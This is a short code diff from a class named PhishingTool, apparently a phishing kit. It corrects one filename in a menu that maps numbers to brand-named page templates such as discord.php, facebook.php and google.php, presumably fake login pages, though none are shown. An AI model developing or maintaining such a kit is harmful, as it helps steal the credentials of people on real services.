@@ -53,7 +53,7 @@ class PhishingTool:
             "3": "collection.php",
             "4": "copy.php",
             "5": "discord.php",
-            "6": "facebookg.php",
+            "6": "facebook.php",
             "7": "freefire.php",
             "8": "github.php",
             "9": "google.php",
